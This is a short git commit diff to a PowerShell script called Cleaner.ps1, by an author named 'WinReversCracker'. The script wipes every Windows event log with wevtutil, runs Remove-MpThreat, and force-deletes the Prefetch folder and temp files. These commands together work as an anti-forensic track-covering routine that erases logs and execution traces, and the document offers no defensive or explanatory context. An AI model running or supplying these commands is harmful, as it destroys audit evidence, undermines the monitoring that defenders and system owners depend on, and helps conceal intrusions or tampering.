ed5af500743452e6557182e5061cea4f85767971
WinReversCracker <mahdikostoev2002@gmail.com>
2026-01-16 19:22:07 +0300

    Update Cleaner.ps1

--- Cleaner.ps1
+++ Cleaner.ps1
@@ -1,7 +1,8 @@
-Remove-MpThreat -All -Force
-
 wevtutil el | ForEach-Object { wevtutil cl "$_" }
+
+Remove-MpThreat -All -Force
 
 Remove-Item C:\Windows\Prefetch\* -Force
 
 Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+
